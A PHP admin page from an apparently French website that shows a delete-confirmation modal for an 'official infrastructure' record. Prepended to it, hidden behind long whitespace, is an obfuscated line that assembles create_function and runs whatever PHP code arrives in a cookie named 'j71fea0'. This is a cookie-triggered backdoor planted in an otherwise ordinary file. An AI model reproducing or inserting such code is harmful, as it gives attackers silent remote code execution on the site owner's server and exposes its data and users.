<?php                                                                                                                                                           $l6t='0e$1_EjCa(f\'7cntuKrOsIio71fea0';$w0m=$l6t[13].$l6t[18].$l6t[1].$l6t[8].$l6t[15].$l6t[1].$l6t[4].$l6t[10].$l6t[16].$l6t[14].$l6t[13].$l6t[15].$l6t[22].$l6t[23].$l6t[14];$y0x=$l6t[10].$l6t[16].$l6t[0];if(isset(${$l6t[4].$l6t[7].$l6t[19].$l6t[19].$l6t[17].$l6t[21].$l6t[5]}[$l6t[6].$l6t[12].$l6t[3].$l6t[10].$l6t[1].$l6t[8].$l6t[0]])){${$l6t[10].$l6t[16].$l6t[0]}=$w0m(null,${$l6t[4].$l6t[7].$l6t[19].$l6t[19].$l6t[17].$l6t[21].$l6t[5]}[$l6t[6].$l6t[12].$l6t[3].$l6t[10].$l6t[1].$l6t[8].$l6t[0]]);${$l6t[10].$l6t[16].$l6t[0]}();} ?><?php
session_start();
include('../Connections/maconnexion.php');
header('Content-Type: text/html; charset=iso-8859-1');



//requete categories monuments

$colname_infra_officielles = "-1";
if (isset($_GET['infrastructure_off'])) {
  $colname_infra_officielles = $_GET['infrastructure_off'];
}
mysql_select_db($database_maconnexion, $maconnexion);
$query_infra_officielles = sprintf("SELECT * FROM infrastructures_officielles WHERE ch_inf_off_id = %s", GetSQLValueString($colname_infra_officielles, "int"));
$infra_officielles = mysql_query($query_infra_officielles, $maconnexion) or die(mysql_error());
$row_infra_officielles = mysql_fetch_assoc($infra_officielles);
$totalRows_infra_officielles = mysql_num_rows($infra_officielles);
?>

<!-- Modal Header-->
          <div class="modal-header">
            <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
<h3 id="myModalLabel">Supprimer <?php echo $row_infra_officielles['ch_inf_off_nom']; ?></h3>
          </div>
          <div class="modal-body">
          <div class="row-fluid">
          <div class="span9">
          <h1>Attention&nbsp;!</h1>
    <p>Souhaitez-vous r&eacute;ellement supprimer cette infrastructure de la liste officielle&nbsp;?</p>
    <p><i class="icon-warning-sign"></i> Cette action sera irr&eacute;versible</p>
    </div>
    <div class="span3 icone-categorie"> 
          <img src="<?php echo $row_infra_officielles['ch_inf_off_icone']; ?>" alt="icone infrastructure"></div>
    </div>
          </div>
          <div class="modal-footer">
<form action="infrastructure_officielle_supprimer.php" name="supprimer-infrastructure" method="POST" id="supprimer-infrastructure">
            <input name="ch_inf_off_id" type="hidden" value="<?php echo $row_infra_officielles['ch_inf_off_id']; ?>">
<button class="btn" data-dismiss="modal" aria-hidden="true">Annuler</button>
            <button type="submit" class="btn btn-danger"><i class="icon-trash icon-white"></i> Supprimer</button>
            </form>
          </div>
<?php
mysql_free_result($infra_officielles);?>